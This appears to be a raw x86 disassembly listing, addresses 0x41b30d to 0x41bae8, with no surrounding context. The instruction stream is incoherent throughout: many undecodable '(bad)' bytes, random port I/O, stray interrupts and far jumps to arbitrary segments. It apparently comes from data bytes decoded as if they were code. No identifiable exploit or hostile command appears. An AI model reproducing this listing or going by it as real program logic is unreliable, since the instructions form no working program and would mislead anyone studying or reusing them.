  41b30d:	mov    edi,0x27d7671d
  41b312:	gs loopne 0x41b2f6
  41b315:	(bad)  
  41b316:	mov    bh,0xaf
  41b318:	pop    eax
  41b319:	sub    esp,DWORD PTR [esi]
  41b31b:	jne    0x41b2e1
  41b31d:	cmp    al,0xcd
  41b31f:	loop   0x41b337
  41b321:	push   edx
  41b322:	lods   eax,DWORD PTR ds:[esi]
  41b323:	push   ds
  41b324:	push   ebp
  41b325:	in     al,dx
  41b326:	aaa    
  41b327:	in     al,0x51
  41b329:	mov    bh,0x57
  41b32b:	jge    0x41b2ce
  41b32d:	push   ebp
  41b32e:	push   ss
  41b32f:	mov    DWORD PTR [ecx-0x4d],0xa466f03
  41b336:	push   edi
  41b337:	push   edx
  41b338:	push   ebx
  41b339:	and    al,0xf9
  41b33b:	stos   BYTE PTR es:[edi],al
  41b33c:	popf   
  41b33d:	je     0x41b2f1
  41b33f:	shl    BYTE PTR [ecx-0x47b99929],1
  41b345:	ficom  DWORD PTR [ebp+0x309c63a0]
  41b34b:	mov    ds:0x4d01c99a,al
  41b350:	das    
  41b351:	cmp    eax,0x7d6a0812
  41b356:	rcl    BYTE PTR [edi-0x69],cl
  41b359:	push   0x4b
  41b35b:	push   cs
  41b35c:	pop    ecx
  41b35d:	ds pop eax
  41b35f:	pusha  
  41b360:	int    0xa7
  41b362:	or     BYTE PTR [eax+0x4c],dh
  41b365:	xchg   edi,eax
  41b366:	fistp  WORD PTR [ebx-0x44]
  41b369:	inc    ebx
  41b36a:	aas    
  41b36b:	sti    
  41b36c:	mov    edx,0x554af8f9
  41b371:	dec    ebp
  41b372:	add    BYTE PTR [ecx+0x69b2fe35],bl
  41b378:	(bad)  
  41b379:	out    dx,eax
  41b37a:	sub    al,0x31
  41b37c:	pop    esi
  41b37d:	enter  0x62bf,0xb4
  41b381:	repnz inc edi
  41b383:	fild   QWORD PTR [esi+0x7]
  41b386:	xor    BYTE PTR [eax],cl
  41b388:	pop    eax
  41b389:	(bad)  
  41b38b:	or     dl,cl
  41b38d:	into   
  41b38e:	idiv   ecx
  41b390:	and    eax,0x380b5103
  41b395:	sub    eax,ecx
  41b397:	and    BYTE PTR [esi+0x6f],bl
  41b39a:	jle    0x41b41b
  41b39c:	and    ecx,eax
  41b39e:	xchg   DWORD PTR [ebp-0x3f],ebp
  41b3a1:	push   ecx
  41b3a2:	stos   DWORD PTR es:[edi],eax
  41b3a3:	int3   
  41b3a4:	je     0x41b3b0
  41b3a6:	add    ecx,DWORD PTR [ebx-0x15]
  41b3a9:	add    eax,0x25366fdf
  41b3ae:	cwde   
  41b3af:	loope  0x41b3ce
  41b3b1:	nop
  41b3b2:	loope  0x41b383
  41b3b4:	jle    0x41b421
  41b3b6:	mov    ds:0x2c8379c8,eax
  41b3bb:	push   0x4d
  41b3bd:	out    0xae,al
  41b3bf:	jnp    0x41b424
  41b3c1:	jbe    0x41b41b
  41b3c3:	and    eax,DWORD PTR [esi-0x63e01109]
  41b3c9:	out    dx,al
  41b3ca:	retf   
  41b3cb:	push   edi
  41b3cc:	push   ebx
  41b3cd:	push   ds
  41b3ce:	sub    al,0x13
  41b3d0:	shr    DWORD PTR [edi-0x2a],1
  41b3d3:	bound  ecx,QWORD PTR [ebx]
  41b3d5:	adc    DWORD PTR [esi-0x6e],esp
  41b3d8:	fdivr  st(7),st
  41b3da:	mov    ds:0x828ce22a,al
  41b3df:	pop    esp
  41b3e0:	lods   eax,DWORD PTR ds:[esi]
  41b3e1:	out    0xb1,eax
  41b3e3:	mov    DWORD PTR [edx-0x4a],0xb7f7e086
  41b3ea:	inc    esi
  41b3eb:	dec    esi
  41b3ec:	xor    al,0xc2
  41b3ee:	sbb    edx,DWORD PTR [eax+0x15]
  41b3f1:	mov    ecx,DWORD PTR [ecx+eiz*8+0x4ec79e64]
  41b3f8:	xor    bh,BYTE PTR [eax-0x63]
  41b3fb:	and    ah,BYTE PTR [edi-0x65]
  41b3fe:	push   ss
  41b3ff:	sub    ah,al
  41b401:	or     eax,0xdcc451ad
  41b406:	or     cl,dh
  41b408:	or     DWORD PTR [edx+ecx*2-0x41],esi
  41b40c:	loopne 0x41b448
  41b40e:	mul    ah
  41b410:	adc    dh,BYTE PTR [esi-0x32f0515d]
  41b416:	pop    ebx
  41b417:	(bad)  [edi-0x25103336]
  41b41d:	pop    es
  41b41e:	xchg   esi,eax
  41b41f:	nop
  41b420:	das    
  41b421:	mov    ebx,0x2b52e6e2
  41b426:	inc    ecx
  41b427:	scas   al,BYTE PTR es:[edi]
  41b428:	xor    esi,DWORD PTR [edx+0x1574cf88]
  41b42e:	or     BYTE PTR [ebx+0x20b2796a],ch
  41b434:	push   es
  41b435:	xor    cl,BYTE PTR [edi-0x2d]
  41b438:	sahf   
  41b439:	test   al,0x7a
  41b43b:	pop    ecx
  41b43c:	push   cs
  41b43d:	dec    ebp
  41b43e:	in     eax,dx
  41b43f:	iret   
  41b440:	mov    eax,ds:0xf3438280
  41b445:	jmp    FWORD PTR [bx+di]
  41b448:	mov    dh,0x8f
  41b44a:	mov    WORD PTR [esi],cs
  41b44c:	cli    
  41b44d:	in     eax,dx
  41b44e:	fnstenv [ebp+edi*2+0xc]
  41b452:	xchg   ebp,eax
  41b453:	mov    esp,0x2305d170
  41b458:	jno    0x41b3f9
  41b45a:	xchg   edi,eax
  41b45b:	adc    eax,0x416c7787
  41b460:	pop    edi
  41b461:	test   al,0xc8
  41b463:	ret    0x5537
  41b466:	push   esi
  41b467:	mov    ch,ch
  41b469:	dec    edi
  41b46a:	and    al,0xea
  41b46c:	dec    ebx
  41b46d:	loopne 0x41b431
  41b46f:	jno    0x41b474
  41b471:	rcr    BYTE PTR [ebp+eax*4+0x73ba4c33],1
  41b478:	jle    0x41b4d0
  41b47a:	pop    ebp
  41b47b:	dec    edx
  41b47c:	dec    eax
  41b47d:	cmc    
  41b47e:	and    DWORD PTR [edx],ebx
  41b480:	or     esp,DWORD PTR [edx]
  41b482:	xlat   BYTE PTR ds:[ebx]
  41b483:	add    al,0x9
  41b485:	or     cl,bh
  41b487:	aas    
  41b488:	je     0x41b43d
  41b48a:	fcmovbe st,st(2)
  41b48c:	punpckhdq mm2,QWORD PTR [edi]
  41b48f:	adc    ecx,DWORD PTR [edx+0x4470a8c2]
  41b495:	mov    al,ds:0xbde820b5
	...
  41b512:	add    BYTE PTR [eax],al
  41b514:	pop    ebp
  41b515:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  41b51f:	rcr    BYTE PTR [edi-0xa39f41f],cl
  41b525:	push   ebx
  41b526:	add    DWORD PTR [eax],eax
  41b528:	outs   dx,BYTE PTR ds:[esi]
  41b529:	pop    es
  41b52a:	add    BYTE PTR [eax],al
  41b52c:	inc    esi
  41b52d:	jno    0x41b59a
  41b52f:	in     al,dx
  41b530:	pop    ds
  41b531:	pop    edx
  41b532:	(bad)  
  41b534:	xor    eax,0x743a6263
  41b539:	loopne 0x41b57a
  41b53b:	jecxz  0x41b58d
  41b53d:	xchg   edx,eax
  41b53e:	inc    edi
  41b53f:	cmp    al,0x97
  41b541:	mov    ebx,0x892e176a
  41b546:	cs xchg bh,ch
  41b549:	out    dx,al
  41b54a:	int3   
  41b54b:	sbb    eax,0x22b1a9e9
  41b550:	xchg   esp,eax
  41b551:	xchg   DWORD PTR ds:0x8c9526cf,esp
  41b557:	dec    edi
  41b558:	cmp    DWORD PTR [edi-0x5f5ab5f6],ebp
  41b55e:	adc    DWORD PTR ds:0xd4807afd,esp
  41b564:	std    
  41b565:	rcr    BYTE PTR [esi-0x9ebae02],0x37
  41b56c:	push   ss
  41b56d:	sar    cl,cl
  41b56f:	rcr    esp,cl
  41b571:	push   eax
  41b572:	and    BYTE PTR [ebx],0xab
  41b575:	mov    esi,0x79cf3fef
  41b57a:	test   al,0x3d
  41b57c:	cld    
  41b57d:	imul   ecx,DWORD PTR [esi-0x53],0xc1d9137e
  41b584:	pop    ecx
  41b585:	popf   
  41b586:	mov    dl,0x13
  41b588:	pop    dx
  41b58a:	outs   dx,DWORD PTR ds:[esi]
  41b58b:	jmp    0x9a16:0x28c37668
  41b592:	fisubr WORD PTR [edi-0x66ccdb0c]
  41b598:	mov    ah,0x17
  41b59a:	dec    ebx
  41b59b:	cs push edi
  41b59d:	nop
  41b59e:	outs   dx,BYTE PTR ds:[esi]
  41b59f:	cmp    DWORD PTR [ebp+0x11a8a628],ebp
  41b5a5:	fnstenv [esi+0x76]
  41b5a8:	aad    0xeb
  41b5aa:	cmp    eax,0x24648fcc
  41b5af:	call   0x1928c0ed
  41b5b4:	rcl    edi,1
  41b5b6:	dec    edi
  41b5b7:	jbe    0x41b60a
  41b5b9:	in     eax,0xfd
  41b5bb:	pop    edi
  41b5bc:	lahf   
  41b5bd:	sub    ebx,DWORD PTR [ecx]
  41b5bf:	inc    esi
  41b5c0:	fadd   QWORD PTR [ecx+0x35]
  41b5c3:	mov    al,dh
  41b5c5:	mov    cl,0x45
  41b5c7:	xor    DWORD PTR [ecx],ebx
  41b5c9:	div    DWORD PTR [ebp+0x74]
  41b5cc:	and    al,BYTE PTR [edi+0x61]
  41b5cf:	dec    ebp
  41b5d0:	repz fcomp QWORD PTR [ebp+0x1]
  41b5d4:	or     al,0x47
  41b5d6:	sbb    ebp,DWORD PTR [eax]
  41b5d8:	mov    ds:0xb58948a8,eax
  41b5dd:	mov    ebx,0xf9302c61
  41b5e2:	ret    
  41b5e3:	mov    ah,0x29
  41b5e5:	xchg   ebp,eax
  41b5e6:	inc    ebp
  41b5e7:	xchg   ecx,eax
  41b5e8:	mov    ds:0xaef6bfdd,al
  41b5ed:	stos   DWORD PTR es:[edi],eax
  41b5ee:	cmp    bl,bl
  41b5f0:	push   esi
  41b5f1:	sub    BYTE PTR [ecx+ebp*2],0x4d
  41b5f5:	adc    BYTE PTR [ebx-0x8b191b7],dh
  41b5fb:	xchg   edx,eax
  41b5fc:	xor    bh,cl
  41b5fe:	push   cs
  41b5ff:	mov    ebx,0xaf14271b
  41b604:	pop    esp
  41b605:	ret    
  41b606:	jl     0x41b652
  41b608:	jmp    0x1c90:0xcfdbb27b
  41b60f:	(bad)  
  41b610:	push   ss
  41b611:	jnp    0x41b682
  41b613:	addr16 ret 0xe3aa
  41b617:	add    BYTE PTR [ebp-0x63],dl
  41b61a:	pop    esp
  41b61b:	(bad)  
  41b61c:	dec    edx
  41b61d:	inc    esi
  41b61e:	sub    ch,bh
  41b620:	fistp  WORD PTR ds:0xd79fe39f
  41b626:	sti    
  41b627:	mov    dh,0xd
  41b629:	fs add dl,0x7b
  41b62d:	es push 0x49edd6d7
  41b633:	sbb    dl,BYTE PTR [edi-0x2c]
  41b636:	cmp    BYTE PTR [ecx],bl
  41b638:	mov    al,ds:0x52cc4cde
  41b63d:	xor    BYTE PTR [ecx+0x15a6e96b],0xcb
  41b644:	xor    al,0xbf
  41b646:	lods   eax,DWORD PTR ds:[esi]
  41b647:	addr16 jno 0x41b66a
  41b64a:	sbb    BYTE PTR [ebx-0x7ba2d162],dl
  41b650:	dec    eax
  41b651:	mov    ecx,0x7f39a54e
  41b656:	popf   
  41b657:	mov    edx,0x50b04b3a
  41b65c:	imul   DWORD PTR [ebp+0x5c]
  41b65f:	mov    eax,0x5588b8e9
  41b664:	xor    BYTE PTR [ebp+0x60],0xe9
  41b668:	mov    edi,0x698605b3
  41b66d:	lock leave 
  41b66f:	into   
  41b670:	jp     0x41b66a
  41b672:	in     al,dx
  41b673:	scas   al,BYTE PTR es:[edi]
  41b674:	(bad)
  41b677:	cmp    bh,BYTE PTR [edx]
  41b679:	mov    edx,0x9cff52d
  41b67e:	int    0x3e
  41b680:	scas   eax,DWORD PTR es:[edi]
  41b681:	test   DWORD PTR [esi+ebp*2+0x62],ecx
  41b685:	lods   al,BYTE PTR ds:[esi]
  41b686:	adc    DWORD PTR [edx+0x4d],eax
  41b689:	adc    dl,BYTE PTR [ebx+0x6]
  41b68c:	mov    ch,0x80
  41b68e:	jb     0x41b65d
  41b690:	or     al,0x19
  41b692:	(bad)  
  41b693:	pop    eax
  41b694:	cmp    eax,0x6ceabd3b
  41b699:	gs in  al,dx
  41b69b:	mov    esi,0x188ae464
  41b6a0:	push   cs
  41b6a1:	aad    0xf9
  41b6a3:	inc    ebx
  41b6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6a5:	lods   eax,DWORD PTR ds:[esi]
  41b6a6:	test   al,0xde
  41b6a8:	mov    eax,ds:0x92393b54
  41b6ad:	inc    ebp
  41b6ae:	shl    DWORD PTR ds:0xa53de265,1
  41b6b4:	dec    eax
  41b6b5:	mov    BYTE PTR [edi-0x138c8c44],dl
  41b6bb:	ja     0x41b64d
  41b6bd:	fisttp DWORD PTR [edx+0x7097f557]
  41b6c3:	lods   eax,DWORD PTR ds:[esi]
  41b6c4:	lea    ecx,[edx]
  41b6c6:	rol    ecx,cl
  41b6c8:	dec    ebp
  41b6c9:	jle    0x41b71c
  41b6cb:	jmp    0x41b696
  41b6cd:	ds mov edi,0xa8ee4190
  41b6d3:	bound  edx,QWORD PTR [edx]
  41b6d5:	idiv   DWORD PTR [esi]
  41b6d7:	stos   BYTE PTR es:[edi],al
  41b6d8:	mov    ecx,0xe2572b01
  41b6dd:	adc    eax,0xaa2729df
  41b6e2:	sahf   
  41b6e3:	test   al,0x9d
  41b6e5:	into   
  41b6e6:	nop
  41b6e7:	ret    0xf6b2
  41b6ea:	adc    esp,edx
  41b6ec:	sbb    eax,0xbb3cc25b
  41b6f1:	aam    0xb4
  41b6f3:	mov    ch,ah
  41b6f5:	and    BYTE PTR [edx+eax*4-0x17],bh
  41b6f9:	mov    esp,0x8a1d4692
  41b6fe:	dec    ebx
  41b6ff:	scas   al,BYTE PTR es:[edi]
  41b700:	bts    eax,eax
  41b703:	add    ebp,DWORD PTR [esi]
  41b705:	repz fs push ecx
  41b708:	(bad)  
  41b709:	rcl    BYTE PTR [edx-0xdd3e2af],1
  41b70f:	xor    ch,BYTE PTR [edx-0x613bdcd4]
  41b715:	std    
  41b716:	dec    ecx
  41b717:	call   0xbd50:0x83b31ca8
  41b71e:	push   ds
  41b71f:	fmul   DWORD PTR [edi-0x3bc7ca49]
  41b725:	ret    
  41b726:	adc    BYTE PTR [ecx+0x423c5b69],bl
  41b72c:	inc    edx
  41b72d:	repnz pop ebx
  41b72f:	fwait
  41b730:	shr    ebx,1
  41b732:	in     eax,0xac
  41b734:	push   edi
  41b735:	push   0x5ad67918
  41b73a:	jecxz  0x41b6d1
  41b73c:	daa    
  41b73d:	loope  0x41b6e8
  41b73f:	inc    eax
  41b740:	or     BYTE PTR [ebx],0x46
  41b743:	in     al,0x16
  41b745:	scas   al,BYTE PTR es:[edi]
  41b746:	sub    BYTE PTR [ecx],dl
  41b748:	popa   
  41b749:	sbb    ebx,DWORD PTR [edi]
  41b74b:	aad    0xa7
  41b74d:	cmp    al,0x3c
  41b74f:	sbb    al,0x76
  41b751:	enter  0x2388,0x43
  41b755:	clc    
  41b756:	mov    ch,0x21
  41b758:	sub    DWORD PTR [ebp+ebp*2+0x3c],eax
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	(bad)  
  41b75e:	mov    ebp,0x2c9c8a21
  41b763:	popa   
  41b764:	push   es
  41b765:	pop    eax
  41b766:	inc    esi
  41b767:	enter  0x3cdf,0xdc
  41b76b:	retf   
  41b76c:	adc    BYTE PTR [esi],cl
  41b76e:	nop
  41b76f:	aaa    
  41b770:	sub    ah,BYTE PTR ds:0x819c7ed6
  41b776:	in     eax,0xec
  41b778:	(bad)  
  41b77a:	int    0x38
  41b77c:	cmp    edi,DWORD PTR [ecx-0x36a28bac]
  41b782:	mov    al,0xbe
  41b784:	leave  
  41b785:	dec    eax
  41b786:	inc    esp
  41b787:	fisttp DWORD PTR [ecx-0x1d98a541]
  41b78d:	xor    al,0x71
  41b78f:	stc    
  41b790:	fdivr  QWORD PTR ds:0x7c01224b
  41b796:	push   ecx
  41b797:	out    dx,al
  41b798:	out    0x4,eax
  41b79a:	pushf  
  41b79b:	inc    eax
  41b79c:	scas   al,BYTE PTR es:[edi]
  41b79d:	rcr    DWORD PTR [esi+0x33ed9f33],1
  41b7a3:	lods   eax,DWORD PTR ds:[esi]
  41b7a4:	jecxz  0x41b790
  41b7a6:	mov    esi,0xc30be3b2
  41b7ab:	mov    BYTE PTR [ecx-0x2b],ch
  41b7ae:	pop    esp
  41b7af:	ins    BYTE PTR es:[edi],dx
  41b7b0:	(bad)  
  41b7b1:	fsubr  DWORD PTR [esi]
  41b7b3:	sbb    BYTE PTR [esp+ecx*1+0x1f],bh
  41b7b7:	xor    ch,BYTE PTR [esi+0x23]
  41b7ba:	ret    0xf425
  41b7bd:	mov    ebx,0x65fa0345
  41b7c2:	push   edx
  41b7c3:	sbb    DWORD PTR [ebx],edx
  41b7c5:	nop
  41b7c6:	sub    DWORD PTR [esi+0x1851a08b],esi
  41b7cc:	pop    ebx
  41b7cd:	inc    eax
  41b7ce:	jle    0x41b822
  41b7d0:	test   DWORD PTR [esp+edx*8+0x2a1f3589],eax
  41b7d7:	arpl   WORD PTR [esi+0x73dd520b],di
  41b7dd:	fsub   DWORD PTR gs:[ebx+0x17]
  41b7e1:	pushf  
  41b7e2:	adc    al,BYTE PTR [ecx+0x18]
  41b7e5:	test   al,0x6a
  41b7e7:	retf   
  41b7e8:	popa   
  41b7e9:	dec    DWORD PTR [esi-0x7e]
  41b7ec:	repnz int 0x7d
  41b7ef:	ins    DWORD PTR es:[edi],dx
  41b7f0:	icebp  
  41b7f1:	ja     0x41b81f
  41b7f3:	ret    
  41b7f4:	ja     0x41b7d9
  41b7f6:	push   esi
  41b7f7:	pop    esp
  41b7f8:	mov    WORD PTR [edx-0x34],es
  41b7fb:	sub    al,0x8
  41b7fd:	lods   eax,DWORD PTR ds:[esi]
  41b7fe:	mov    edx,0xe56ff3b9
  41b803:	push   ss
  41b804:	sbb    eax,0xfe4112a8
  41b809:	iret   
  41b80a:	dec    eax
  41b80b:	dec    ebx
  41b80c:	mov    ecx,DWORD PTR [ebx+esi*1-0x8563bb4]
  41b813:	mov    ebp,0xe073ac25
  41b818:	cwde   
  41b819:	cwde   
  41b81a:	ins    BYTE PTR es:[edi],dx
  41b81b:	rcr    BYTE PTR [edi],0x52
  41b81e:	cs cs das 
  41b821:	add    DWORD PTR [esi],esp
  41b823:	jp     0x41b85b
  41b825:	pop    ecx
  41b826:	and    BYTE PTR [esi+0x6dfeef8b],dh
  41b82c:	ds in  eax,dx
  41b82e:	fdivr  st,st(6)
  41b830:	sbb    esp,DWORD PTR [eax]
  41b832:	fcmovnbe st,st(2)
  41b834:	pop    ds
  41b835:	sbb    ebx,DWORD PTR [ecx-0x3fee4bc8]
  41b83b:	std    
  41b83c:	mov    ecx,0xa42e932a
  41b841:	jae    0x41b7cb
  41b843:	shr    DWORD PTR [edx-0x7d],0x60
  41b847:	mov    al,0xba
  41b849:	mov    dh,0xce
  41b84b:	jb     0x41b808
  41b84d:	jmp    0x41b800
  41b84f:	sub    BYTE PTR [esi+ebp*4],ah
  41b852:	pop    es
  41b853:	retf   
  41b854:	sub    eax,0x50b3cdfb
  41b859:	fsubr  QWORD PTR [edx-0x5aac94e7]
  41b85f:	push   ss
  41b860:	fs pop eax
  41b862:	adc    ah,BYTE PTR [edx+0x10]
  41b865:	fs or  al,0x29
  41b868:	scas   al,BYTE PTR es:[edi]
  41b869:	mov    bh,0x37
  41b86b:	pusha  
  41b86c:	enter  0x855f,0x1a
  41b870:	sub    al,0x21
  41b872:	xlat   BYTE PTR ds:[ebx]
  41b873:	sub    DWORD PTR [edi-0x736c893e],0x2a085bd6
  41b87d:	repz add eax,0xf897c0b1
  41b883:	push   edx
  41b884:	pop    ecx
  41b885:	call   0x7e057b9e
  41b88a:	sub    ebx,DWORD PTR [eax-0x7d]
  41b88d:	icebp  
  41b88e:	mov    WORD PTR [ebx],ds
  41b890:	pop    edi
  41b891:	sbb    dh,dl
  41b893:	mov    ch,0x97
  41b895:	adc    al,0xb
  41b897:	dec    edx
  41b898:	pop    ss
  41b899:	mov    eax,ds:0xc0efd5c2
  41b89e:	inc    esi
  41b89f:	(bad)  
  41b8a0:	jns    0x41b8a3
  41b8a2:	imul   edi,ecx,0xa172a43f
  41b8a8:	repz repnz sbb BYTE PTR [edi-0x61565e2],ch
  41b8b0:	outs   dx,BYTE PTR ds:[esi]
  41b8b1:	xchg   edi,eax
  41b8b2:	push   edi
  41b8b3:	push   cs
  41b8b4:	je     0x41b85e
  41b8b6:	sub    BYTE PTR [ebx-0x17fd4f8],ch
  41b8bc:	ficomp WORD PTR [ebx-0x8]
  41b8bf:	pop    esi
  41b8c0:	sub    esp,edi
  41b8c2:	shr    DWORD PTR [esi],cl
  41b8c4:	mov    fs,eax
  41b8c6:	hlt    
  41b8c7:	mov    dh,0xa1
  41b8c9:	jle    0x41b89b
  41b8cb:	popa   
  41b8cc:	(bad)  
  41b8cd:	into   
  41b8ce:	sub    ebx,DWORD PTR [ecx]
  41b8d0:	in     eax,dx
  41b8d1:	lds    edx,FWORD PTR [bp+0x45f2]
  41b8d6:	retf   0xb440
  41b8d9:	ficom  DWORD PTR [esi]
  41b8db:	xor    ebp,edi
  41b8dd:	cwde   
  41b8de:	adc    ch,bl
  41b8e0:	push   esi
  41b8e1:	bound  ebx,QWORD PTR ds:0x416846c0
  41b8e7:	fist   DWORD PTR [eax-0x1]
  41b8ea:	fistp  QWORD PTR [edi-0x41]
  41b8ed:	mov    esi,0x7d47adbc
  41b8f2:	or     al,0x6b
  41b8f4:	fwait
  41b8f5:	outs   dx,DWORD PTR ds:[esi]
  41b8f6:	imul   ebx,DWORD PTR [edi-0x3538799e],0x9e887b75
  41b900:	sbb    cl,bl
  41b902:	pop    edx
  41b903:	lods   eax,DWORD PTR ds:[esi]
  41b904:	or     al,BYTE PTR ds:0x4b74d082
  41b90a:	add    al,bl
  41b90c:	sbb    BYTE PTR [edx],al
  41b90e:	mov    cl,0x26
  41b910:	mov    gs:0x9eef2e40,al
  41b916:	mov    ebp,0x3ca0c30b
  41b91b:	retf   
  41b91c:	outs   dx,BYTE PTR ds:[esi]
  41b91d:	pop    ecx
  41b91e:	jbe    0x41b920
  41b920:	in     eax,0x21
  41b922:	ds inc esp
  41b924:	stos   DWORD PTR es:[edi],eax
  41b925:	test   al,0x10
  41b927:	out    0xe9,eax
  41b929:	pop    ss
  41b92a:	sbb    DWORD PTR [eax+0x4ff66576],edx
  41b930:	mov    ch,0xcd
  41b932:	sbb    edx,DWORD PTR [esi-0xa]
  41b935:	inc    ecx
  41b936:	mov    edx,0x8d753871
  41b93b:	xor    al,0x84
  41b93d:	test   BYTE PTR [ebx+0x3749e4ec],bl
  41b943:	mov    ch,0x1c
  41b945:	push   edx
  41b946:	and    ecx,DWORD PTR [edi-0x7923b200]
  41b94c:	loop   0x41b9a6
  41b94e:	xor    BYTE PTR [ebx],dl
  41b950:	inc    edi
  41b951:	ss int3 
  41b953:	pop    eax
  41b954:	push   edx
  41b955:	sub    dh,BYTE PTR [edi+0x5b]
  41b958:	test   eax,0xc9a5200a
  41b95d:	aaa    
  41b95e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b95f:	mov    dl,0xe9
  41b961:	and    al,0x35
  41b963:	mov    dl,0x46
  41b965:	xchg   esi,eax
  41b966:	mov    edx,0x931dcd92
  41b96b:	nop
  41b96c:	scas   eax,DWORD PTR es:[edi]
  41b96d:	sub    dh,BYTE PTR [ebx+0x57c7cfb0]
  41b973:	pop    es
  41b974:	jecxz  0x41b925
  41b976:	std    
  41b977:	in     eax,0x1b
  41b979:	arpl   WORD PTR [esi],bx
  41b97b:	mov    cl,0xd8
  41b97d:	pop    ecx
  41b97e:	cmp    ecx,0xffffffb9
  41b981:	or     ch,al
  41b983:	inc    ebx
  41b984:	inc    esp
  41b985:	push   0xc97e8e11
  41b98a:	jl     0x41b935
  41b98c:	stos   DWORD PTR es:[edi],eax
  41b98d:	adc    BYTE PTR [ebx],dh
  41b98f:	in     eax,dx
  41b990:	jbe    0x41b9dd
  41b992:	ret    
  41b993:	cmp    al,ah
  41b995:	xor    BYTE PTR [edi],dl
  41b997:	test   DWORD PTR [esi],edx
  41b999:	clc    
  41b99a:	aas    
  41b99b:	repnz dec edx
  41b99d:	push   ds
  41b99e:	unpcklps xmm6,XMMWORD PTR ds:0xe6be730e
  41b9a5:	(bad)  [edx-0x88ad483]
  41b9ab:	jb     0x41b961
  41b9ad:	das    
  41b9ae:	std    
  41b9af:	pop    ss
  41b9b0:	(bad)  
  41b9b2:	retw   
  41b9b4:	mov    dl,0x3c
  41b9b6:	hlt    
  41b9b7:	jb     0x41ba18
  41b9b9:	aas    
  41b9ba:	add    ebp,ecx
  41b9bc:	mov    dl,0x4f
  41b9be:	test   BYTE PTR [ebp+0x175e4d7a],bh
  41b9c4:	mov    esp,edx
  41b9c6:	cmp    ecx,DWORD PTR [eax-0xf]
  41b9c9:	stc    
  41b9ca:	xor    ah,dh
  41b9cc:	loope  0x41b974
  41b9ce:	outs   dx,BYTE PTR ds:[esi]
  41b9cf:	sbb    eax,0x500f3a6e
  41b9d4:	clc    
  41b9d5:	mov    bh,0xdc
  41b9d7:	or     edx,DWORD PTR [ebx]
  41b9d9:	xchg   edi,eax
  41b9da:	mov    bl,0xc4
  41b9dc:	add    ebx,DWORD PTR [eax+0x78a69e35]
  41b9e2:	dec    esi
  41b9e3:	or     ebx,ebp
  41b9e5:	jle    0x41ba56
  41b9e7:	stos   DWORD PTR es:[edi],eax
  41b9e8:	sbb    al,0x65
  41b9ea:	push   es
  41b9eb:	pop    ebp
  41b9ec:	outs   dx,BYTE PTR ds:[esi]
  41b9ed:	xchg   DWORD PTR [ebp+0x3ac577b2],esp
  41b9f3:	shr    DWORD PTR [eax],0xa3
  41b9f6:	push   edi
  41b9f7:	lods   eax,DWORD PTR ds:[esi]
  41b9f8:	loope  0x41ba74
  41b9fa:	jmp    FWORD PTR [eax-0x30]
  41b9fd:	fwait
  41b9fe:	add    dh,BYTE PTR [esi]
  41ba00:	and    ebp,ecx
  41ba02:	adc    dh,BYTE PTR [ebp+0x10]
  41ba05:	lods   al,BYTE PTR ds:[esi]
  41ba06:	hlt    
  41ba07:	int    0x2b
  41ba09:	lds    edx,FWORD PTR [ecx]
  41ba0b:	sbb    al,BYTE PTR [ecx]
  41ba0d:	fldcw  WORD PTR [edx-0x6d0aa55e]
  41ba13:	in     eax,dx
  41ba14:	pop    ds
  41ba15:	xchg   BYTE PTR [edi],bh
  41ba17:	push   ebp
  41ba18:	jge    0x41ba71
  41ba1a:	mov    edx,0x548b60d2
  41ba1f:	cs sub al,0xa1
  41ba22:	gs (bad) 
  41ba25:	pop    es
  41ba26:	sbb    esi,DWORD PTR [eax-0xdc6b321]
  41ba2c:	test   eax,0x4c82e85e
  41ba31:	data16 jnp 0x41b9e3
  41ba34:	fidivr DWORD PTR [edi+0x3eeb84bd]
  41ba3a:	jns    0x41b9dd
  41ba3c:	mov    al,ss:0x6c270892
  41ba42:	add    BYTE PTR [ebx-0x6c6fdaad],0xa0
  41ba49:	ror    DWORD PTR [eax],cl
  41ba4b:	push   ebp
  41ba4c:	jae    0x41b9da
  41ba4e:	adc    eax,0xe81993ec
  41ba53:	mov    ecx,0x17a48aea
  41ba58:	jb     0x41ba5f
  41ba5a:	add    ch,ch
  41ba5c:	lods   al,BYTE PTR ds:[esi]
  41ba5d:	xchg   esi,eax
  41ba5e:	int3   
  41ba5f:	int3   
  41ba60:	mov    eax,0xd355f1cc
  41ba65:	and    DWORD PTR [ecx+0x2c1ce2d0],0xffffffe6
  41ba6c:	jns    0x41baab
  41ba6e:	rcl    BYTE PTR [eax+0x3392726],0xfd
  41ba75:	std    
  41ba76:	mov    DWORD PTR [ebp-0x7e35d207],esi
  41ba7c:	pop    eax
  41ba7d:	add    DWORD PTR [ebx+ecx*1],0x36f971c4
  41ba84:	ins    DWORD PTR es:[edi],dx
  41ba85:	mov    eax,ds:0xa580332c
  41ba8a:	sub    BYTE PTR [edx-0x13b9db8d],al
  41ba90:	cld    
  41ba91:	dec    esi
  41ba92:	xlat   BYTE PTR ds:[ebx]
  41ba93:	rcr    DWORD PTR [ebp-0x1e2d21f3],1
  41ba99:	inc    eax
  41ba9a:	test   eax,0xcacad365
  41ba9f:	xchg   esi,eax
  41baa0:	jmp    DWORD PTR [esi+0x2d1e0b0e]
  41baa6:	xchg   esi,eax
  41baa7:	or     dl,BYTE PTR [edx+0x55]
  41baaa:	jmp    0x41bb10
  41baac:	outs   dx,BYTE PTR ds:[esi]
  41baad:	out    dx,eax
  41baae:	repz imul di,WORD PTR [esi-0x5],0x1a06
  41bab5:	dec    ebx
  41bab6:	sbb    eax,0x9d6d2672
  41babb:	sar    DWORD PTR [esi],1
  41babd:	inc    edx
  41babe:	cli    
  41babf:	test   DWORD PTR [ebp-0x25],edx
  41bac2:	lods   eax,DWORD PTR ds:[esi]
  41bac3:	add    eax,0x3044a915
  41bac8:	ins    BYTE PTR es:[edi],dx
  41bac9:	adc    al,0x41
  41bacb:	pusha  
  41bacc:	test   DWORD PTR [edi+0x29a2398e],ecx
  41bad2:	retf   
  41bad3:	mov    ebp,0xc971013b
  41bad8:	fwait
  41bad9:	sub    al,0x4
  41badb:	adc    BYTE PTR [eax+0x4d],0xda
  41badf:	push   ecx
  41bae0:	sub    cl,BYTE PTR [edx]
  41bae2:	and    eax,DWORD PTR [ebx]
  41bae4:	outs   dx,BYTE PTR ds:[esi]
  41bae5:	and    BYTE PTR [ecx-0x2f],ch
  41bae8:	outs   dx,BYTE PTR ds:[esi]
